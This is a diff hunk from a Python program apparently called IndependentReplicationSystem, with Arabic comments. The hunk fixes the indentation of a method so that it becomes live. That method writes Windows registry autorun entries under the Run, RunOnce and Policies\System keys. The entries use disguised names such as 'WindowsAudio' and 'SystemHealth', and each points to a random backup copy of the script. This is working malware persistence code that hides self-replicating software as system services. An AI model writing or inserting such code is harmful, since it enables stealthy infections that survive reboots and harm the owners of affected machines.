@@ -1423,39 +1423,39 @@ class IndependentReplicationSystem:
         self.backup_copies = created_copies
         return created_copies
         
-        def install_registry_with_multiple_paths(self):
-            """تثبيت الريجستري بمسارات متعددة"""
-            try:
-                python_exe = sys.executable
-                installed_count = 0
-                
-                registry_entries = [
-                    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", "WindowsAudio"),
-                    (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", "SystemHealth"),
-                    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce", "UserInit"),
-                    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "ShellService"),
-                ]
-                
-                for hkey, subkey, value_name in registry_entries:
-                    try:
-                        # استخدام مسار عشوائي من النسخ
-                        if self.backup_copies:
-                            random_path = random.choice(self.backup_copies)
-                        else:
-                            random_path = self.original_path
-                        
-                        with winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE) as key:
-                            winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, f'"{python_exe}" "{random_path}"')
-                        
-                        installed_count += 1
-                        print(f"✅ ريجستري: {value_name} → {os.path.basename(random_path)}")
-                        
-                    except Exception as e:
-                        print(f"⚠️  فشل ريجستري: {value_name}")
-                
-                return installed_count
-            except Exception as e:
-                return 0
+    def install_registry_with_multiple_paths(self):
+        """تثبيت الريجستري بمسارات متعددة"""
+        try:
+            python_exe = sys.executable
+            installed_count = 0
+            
+            registry_entries = [
+                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", "WindowsAudio"),
+                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", "SystemHealth"),
+                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce", "UserInit"),
+                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "ShellService"),
+            ]
+            
+            for hkey, subkey, value_name in registry_entries:
+                try:
+                    # استخدام مسار عشوائي من النسخ
+                    if self.backup_copies:
+                        random_path = random.choice(self.backup_copies)
+                    else:
+                        random_path = self.original_path
+                    
+                    with winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE) as key:
+                        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, f'"{python_exe}" "{random_path}"')
+                    
+                    installed_count += 1
+                    print(f"✅ ريجستري: {value_name} → {os.path.basename(random_path)}")
+                    
+                except Exception as e:
+                    print(f"⚠️  فشل ريجستري: {value_name}")
+            
+            return installed_count
+        except Exception as e:
+            return 0
     def start_copy(self, copy_path):
         """تشغيل نسخة من البرنامج"""
         try:
